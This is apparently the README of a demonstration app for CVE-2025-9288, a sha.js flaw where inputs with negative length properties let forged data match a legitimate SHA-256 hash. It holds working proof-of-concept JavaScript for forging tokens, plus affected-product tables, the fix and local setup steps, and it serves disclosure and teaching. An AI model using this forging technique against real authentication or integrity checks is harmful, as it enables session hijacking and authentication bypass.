# CVE-2025-9288: SHA.JS Hash Collision Attack Proof-of-Concept

**Critical Hash Collision Vulnerability in sha.js**

**Discovered by:** Nikita Skovoroda (ChALkeR)

**Affected versions:** `<= 2.4.11`

**Fixed version:** `2.4.12`

---

## 1. Vulnerability Overview

A **critical hash collision vulnerability** exists in sha.js versions prior to 2.4.12. Attackers can craft malicious input that produces **identical SHA-256 hashes for completely different data**, enabling authentication bypass and session hijacking.

The flaw stems from **improper input validation** in the `update()` method. It fails to check if input object properties are valid, allowing attackers to pass objects with **negative length properties** (`{ length: -X }`), causing the hash calculation to **rewind** and erase injected malicious data.

**Severity:** CVSS v4.0 **9.1 (Critical)**

---

## 2. Affected Software Products

### 2.1 Enterprise Solutions

| Product | Vendor | Versions | Status |
|---------|--------|----------|--------|
| IBM Edge Application Manager (IEAM) | IBM | 4.5.0–4.5.8, 5.0.1 | Patched (Oct 2025) |
| IBM Business Automation Manager | IBM | Multiple | Patched (Sept 2025) |
| Apollo GraphQL Platform | Apollo | All with sha.js ≤2.4.11 | Fixed in dependencies |
| OpenSearch Dashboards | AWS | 2.0–2.15.x | v2.16.0+ patched |

### 2.2 Linux Distributions

| Distribution | Package | Fixed Version | Advisory |
|--------------|---------|---------------|----------|
| Debian 11 (Bullseye) | node-sha.js | 2.4.11-2+deb11u1 | DLA-4302 |
| Debian 12/13 | node-sha.js | Fixed | DSA-6002 |
| Red Hat Enterprise Linux | nodejs | Per bulletin | RHSA-2025:18744 |
| Ubuntu 22.04/24.04 LTS | node-sha.js | Fixed | USN-7778-1 |

### 2.3 Affected Ecosystems

- **Development:** Node.js web apps, APIs, microservices
- **Blockchain:** Cryptocurrency wallets, transaction verification
- **CMS:** Ghost, Strapi, KeystoneJS
- **Build Tools:** Webpack, Browserify
- **IoT Platforms:** Node-RED, device authentication

**Reach:** 14 million weekly npm downloads

---

## 3. Root Cause Analysis

### 3.1 Technical Issue

The `hash.update()` method in sha.js does not validate input types, allowing negative length values:

```javascript
// Vulnerable code (simplified)
hash.update = function(data) {
    this.position += data.length  // No validation! Can be negative
}
```

### 3.2 Attack Mechanism - Backend Implementation

The backend `/api/exploit` endpoint demonstrates the actual vulnerability:

```javascript
// Official PoC function from backend
const forgeHash = (data, payload) => {
    return JSON.stringify([
        payload, 
        { length: -payload.length },  // NEGATIVE LENGTH!
        [...data]
    ])
}

// In /api/exploit endpoint:
if (req.method === 'POST' && req.url === '/api/exploit') {
    try {
        // Step 1: Get legitimate token from Step 1
        const legitimateTokenHash = req.headers['x-target-hash']
        const legitimateToken = generatedTokens[legitimateTokenHash].token
        const legitimateSessionData = Buffer.from(legitimateToken.sessionData, 'hex')

        // Step 2: Create malicious payload
        const maliciousPayload = 'ADMIN_USER_FORGED'  // 17 characters
        
        // Step 3: Use forgeHash to create exploit array
        const forgedPayload = forgeHash(legitimateSessionData, maliciousPayload)
        const forgedArray = JSON.parse(forgedPayload)
        
        // Step 4: Hash the forged array using VULNERABLE sha.js
        const forgedHash = sha256(...forgedArray)

        // Step 5: Both hashes are IDENTICAL!
        const hashes_match = forgedHash === legitimateTokenHash
    }
}

// Vulnerable hash function (uses sha.js ≤ 2.4.11)
const sha256 = (...messages) => {
    const hash = sha('sha256')
    messages.forEach((m) => hash.update(m))
    return hash.digest('hex')
}
```

**Execution Flow:**

1. **Legitimate Token (Step 1):**
   ```
   sessionData = [39 random bytes]
   sha256(sessionData) = 197116210626e70...
   ```

2. **Forged Token (Step 2 - The Exploit):**
   ```javascript
   // forgedArray structure:
   [
       "ADMIN_USER_FORGED",              // Element 0: Malicious string (17 chars)
       { length: -17 },                  // Element 1: Negative length!
       [all 39 bytes of sessionData]     // Element 2: Legitimate data
   ]
   ```

3. **sha.js Processing (What Goes Wrong):**
   ```
   ITERATION 1: hash.update("ADMIN_USER_FORGED")
     Position: 0 → 17 (added 17 bytes)
     State: [A, D, M, I, N, _, U, S, E, R, _, F, O, R, G, E, D]
   
   ITERATION 2: hash.update({ length: -17 })  ← VULNERABILITY TRIGGERED!
     Position: 17 + (-17) = 0  ← REWIND TO START!
     State: Still contains malicious string but position pointer at 0
   
   ITERATION 3: hash.update([...sessionData])
     Position: 0 → 39 (overwrites from position 0)
     State: [legitimate 39 bytes]  ← Malicious string erased!
   
   FINAL HASH: sha256([legitimate 39 bytes]) = 197116210626e70...
   ```

4. **Result: Hash Collision!**
   ```
   Legitimate Hash: 19711621062...
   Forged Hash:     19711621062...
   Match: TRUE ✗
   ```

### 3.3 Impact

- **Authentication Bypass:** Token verification can be bypassed
- **Data Integrity Compromise:** Tampered data passes validation
- **Key Extraction:** Cryptographic nonces could expose private keys
- **Session Hijacking:** Forged tokens accepted as legitimate

---


## 4. Proof of Concept

### 4.1 PoC Code (From Backend)

```javascript
const forgeHash = (data, payload) => {
    return JSON.stringify([
        payload, 
        { length: -payload.length }, 
        [...data]
    ])
}

const sha = require('sha.js')
const crypto = require('crypto')

const sha256 = (...messages) => {
    const hash = sha('sha256')
    messages.forEach((m) => hash.update(m))
    return hash.digest('hex')
}

// Generate legitimate session
const validMessage = [
    crypto.randomBytes(32),
    crypto.randomBytes(32),
    crypto.randomBytes(32)
]

// Create forged token
const payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')
const receivedMessage = JSON.parse(payload)

console.log('Legitimate:', sha256(...validMessage))
console.log('Forged:    ', sha256(...receivedMessage))
console.log('Match:     ', sha256(...validMessage) === sha256(...receivedMessage))
```

### 4.2 Expected Output

```
Legitimate: 19711621062...
Forged:     19711621062...
Match:      true
```

---

## 5. Exploitation Timeline

- **August 19, 2025:** Vulnerability discovered by ChALkeR
- **August 19, 2025:** Patch released (sha.js 2.4.12)
- **August 20-21, 2025:** Public disclosure & advisories
- **September-October 2025:** Enterprise vendors issue bulletins

**Active Exploitation:** EPSS probability 0.08% (low, but patch released same day)

---

## 6. Mitigation & Remediation

### 6.1 Immediate Action

**Update sha.js:**
```bash
npm update sha.js
```

**Or in package.json:**
```json
{
  "dependencies": {
    "sha.js": "^2.4.12"
  }
}
```

### 6.2 The Fix

sha.js 2.4.12 validates input:

```javascript
hash.update = function(data) {
    if (typeof data.length !== 'number' || data.length < 0) {
        throw new Error('Invalid input')
    }
    this.position += data.length
}
```

### 6.3 Additional Security

**Use Node.js built-in crypto:**
```javascript
const crypto = require('crypto')
const hash = crypto.createHash('sha256')
hash.update(data)
const digest = hash.digest('hex')
```

**Run dependency audits:**
```bash
npm audit
snyk test
```

---

## 7. Demonstration Application

This PoC web application demonstrates CVE-2025-9288 in real-time:

- **Step 1:** Generate legitimate token with random data
- **Step 2:** Execute exploit to forge token with identical hash
- **Step 3:** Verify server accepts forged token as valid
- **Browser Console:** Detailed logs of each exploit step

---

## 8. Installation

### 8.1 Normal Setup

```bash
# Install dependencies
npm install

# Start server
npm start

# Open browser
http://localhost:3000
```

### 8.2 Docker Setup

**Build image:**
```bash
docker build -t cve-2025-9288-demo .
```

**Run container:**
```bash
docker run -p 3000:3000 cve-2025-9288-demo
```

**Access:**
```
http://localhost:3000
```

---

## 9. Usage Guide

### 9.1 Running the Demo

1. **Open DevTools:** Press `F12`
2. **Step 1:** Click "Generate Token"
   - Console: `[✓ TOKEN_GENERATED]` with hash
3. **Step 2:** Click "Execute Exploit"
   - Console: `[RESULT] ✗ HASHES MATCH - VULNERABILITY CONFIRMED!`
4. **Step 3:** Click "Verify Token"
   - Console: `[VALIDATION] MATCH ✓ - TOKEN ACCEPTED!`

### 9.2 Console Output

```
[TOKEN_HASH] 19711621062...
[FORGED_HASH] 19711621062...
Result: Identical hashes = Vulnerability confirmed!
```

## 10. References

### Official Advisories
- **GitHub:** [GHSA-95m3-7q98-8xr5](https://github.com/advisories/GHSA-95m3-7q98-8xr5)
- **Snyk:** [SNYK-JS-SHAJS-12089400](https://security.snyk.io/vuln/SNYK-JS-SHAJS-12089400)
- **NVD:** [CVE-2025-9288](https://nvd.nist.gov/vuln/detail/CVE-2025-9288)


---



